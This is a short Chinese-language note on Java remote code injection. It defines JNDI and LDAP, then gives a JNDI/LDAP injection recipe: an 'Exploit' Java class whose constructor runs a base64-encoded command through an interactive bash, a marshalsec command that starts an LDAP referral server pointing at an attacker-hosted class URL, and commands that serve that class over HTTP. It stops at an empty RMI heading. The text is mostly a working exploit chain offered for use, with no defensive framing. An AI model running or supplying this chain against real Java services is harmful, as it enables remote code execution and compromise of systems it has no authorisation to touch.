# Java 远程代码注入

## JNDI LDAP 注入

>NDI ：
>全称：JAVA NAMING AND Directory interface 
>解释：java 命名目录访问接口：java 命名服务和目录服务而提供的统一API。
>理解：通过命名来访问需要的资源，类似DNS服务，可通过 key-value的形式。


>LDAP ：
>全称：LIGHTWEIGHT DIRECTORY ACCESS Protocol
>解释： 轻量级目录访问协议。是在20世纪90年代早期作为标准目录协议进行开发的。它是目前最流行的目录协议，与厂商、具体平台无关。LDAP用统一的方式定义了如何访问目录服务中的内容，比如增加、修改、删除一个条目
>理解：LDAP用统一的方式定义了如何访问目录服务中的内容，比如增加、修改、删除一个条目。
>LDAP 是协议，LDAP 服务可以理解为“层次数据库”服务，相比关系型数据库，查询更快。

Exp
```java
public class Exploit {
    public Exploit() {
        try {
            Runtime.getRuntime().exec("bash -c {echo,<base64 cmd>}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] argv) {
        Exploit e = new Exploit();
    }
}

```
编译生成``Exploit.class``

使用[marshalsec](https://github.com/mbechler/marshalsec)工具将ldap请求转到http服务上

```
java -cp marslsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:port/#Exploit
```

启动一个``http server`` 使得访问``http://ip:port/Exploit.class``能获取到class文件

可以利用`` python -m SimpleHTTPServer <port>``或``php -S 0.0.0.0:<port>``

## RMI